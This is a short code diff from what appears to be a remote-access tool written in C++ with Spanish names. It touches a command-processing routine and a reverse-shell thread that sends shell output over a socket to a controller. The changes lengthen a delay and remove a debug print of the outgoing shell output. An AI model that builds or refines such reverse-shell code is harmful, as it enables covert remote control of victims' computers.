@@ -245,7 +245,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strCommand.append(1, '\\');
             strCommand.append(item);
             this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
-            Sleep(10);
+            Sleep(30);
             //std::cout << strCommand << std::endl;
         }
         return;
@@ -674,9 +674,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
             strOut.append(1, '\\');
             strOut += cBuffer2;
-            
-            std::cout<<"Sending \n"<<strOut<<std::endl;
-
+        
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
             Sleep(10);
             if (iEnviado <= 0) {
